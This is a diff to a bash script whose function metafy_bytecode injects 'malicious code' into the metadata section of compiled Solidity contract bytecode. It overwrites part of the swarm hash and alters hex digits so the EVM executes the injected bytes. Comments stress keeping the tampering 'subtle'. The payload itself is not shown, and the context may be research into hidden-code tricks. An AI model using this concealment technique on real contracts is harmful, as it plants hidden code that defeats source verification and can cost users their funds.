@@ -13,14 +13,17 @@ function metafy_bytecode() {
     # metadata from solc 0.4 output:
     # 0xa1 0x65 'b' 'z' 'z' 'r' '0' 0x58 0x20 <32 bytes swarm hash> 0x00 0x29
     # 0xa1 65 62 7a 7a 72 30 58 20 <swarm hash> 0x00 29     -- hex
-    # 0xa1 05 02 7a 7a 72 30 58 20 <swarm hash> 0x00 29     -- 6s removed
+    # our malicious metadata:
+    # 0xa1 65 62 7a 7a 72 30 58 20
+    # <28 bytes of swarm hash, 4 bytes of malicious code>
+    # 0x00 29
     local bytecode=$1
 
     # metadata is last 43 bytes
     local pre_metadata=${bytecode:0:-86}
 
     # trim the last 2 bytes of metadata + the length of our malicious code
-    local metadata=${bytecode: -86:-(${#malicious_code}+4)}
+    local metadata=${bytecode: -86:-((${#malicious_code}+4))}
 
     # sanity check. metadata should start as above
     if [ ${metadata:0:18} != "a165627a7a72305820" ]; then
@@ -30,6 +33,9 @@ function metafy_bytecode() {
 
     # replace all 6s in the swarm hash with 0. Hack to prevent evm
     # interpreting malicious code as push data
+    # should also replace sevens, but this worked. Really should do
+    # this in a more precise way, or just nuke the entire swarm hash
+    # (but that wouldn't be very subtle)
     local metadata_tail=${metadata:18}
     local metadata_subsix="${metadata:0:18}${metadata_tail//6/0}"
 
